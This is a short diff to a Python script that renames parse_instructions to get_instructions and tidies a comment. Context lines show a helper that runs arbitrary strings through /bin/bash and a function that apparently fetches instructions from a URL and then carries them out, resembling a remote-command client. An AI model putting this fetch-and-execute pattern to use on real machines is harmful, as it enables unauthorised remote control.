@@ -15,15 +15,14 @@ pythonVersion = sys.version_info[0]
 # if pythonVersion >= 3:
 #     print(f"Running Py3: {pythonVersion}")
 
+
 #  Execute bash command
-
-
 def bash_command(cmd):
     subprocess.Popen(['/bin/bash', '-c', cmd])
 
 
 # this hits a URL and Saves the response
-def parse_instructions(_url=None):
+def get_instructions(_url=None):
     #  URL PARSING
     # Null check on _url param
     if _url == "" or _url == None:
@@ -87,6 +86,6 @@ def do_instructions(_inst):
 
 
 
-# parse_instructions(<YOUR URL HERE>)
-parse_instructions()
+# get_instructions(<YOUR URL HERE>)
+get_instructions()
 # do_datas()
